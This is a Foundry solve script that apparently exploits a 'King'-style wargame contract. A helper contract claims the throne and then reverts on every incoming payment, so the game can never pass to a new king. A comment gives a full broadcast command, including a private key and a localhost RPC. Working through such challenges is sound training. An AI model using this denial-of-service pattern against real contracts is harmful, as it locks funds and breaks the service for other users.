// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function _king() external view returns (address);
    function prize() external view returns (uint256);
    function owner() external view returns (address);
}

contract Helper {
    function trigger(address target) public payable {
        target.call{value:1000000000000000}("");
        console.log("current king : %s", ITarget(target)._king());
        console.log("current prize : %d", ITarget(target).prize());
    }

    receive() external payable {
        revert("HELLLLLLO");
    }
}
contract SolveScript is Script {
    address public target = 0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();


        console.log("current king : %s", ITarget(target)._king());
        console.log("current prize : %d", ITarget(target).prize());

        Helper helper = new Helper();
        console.log("helper address : %s", address(helper));
        helper.trigger{value:1000000000000000}(target);

        vm.stopBroadcast();
    }
}
